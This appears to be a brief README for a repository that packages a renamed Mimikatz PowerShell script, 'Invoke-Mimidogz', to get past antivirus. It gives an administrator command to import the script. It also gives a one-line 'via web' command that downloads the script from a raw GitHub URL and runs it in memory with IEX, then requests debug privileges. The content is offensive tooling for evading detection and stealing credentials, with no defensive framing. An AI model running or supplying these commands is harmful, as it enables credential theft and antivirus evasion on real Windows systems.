### mimikatz bypass Antivirus

(mimikatz 2.1.1 (x64) built on Nov 12 2017 15:32:00)



Powershell as Administrator

    Import-Module .\Invoke-Mimidogz.ps1
    Invoke-Mimikatz -Command "privilege::debug"

or via web:

    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mttstt/mimi/master/Invoke-Mimidogz.ps1');Invoke-Mimidogz -Command "privilege::debug" 
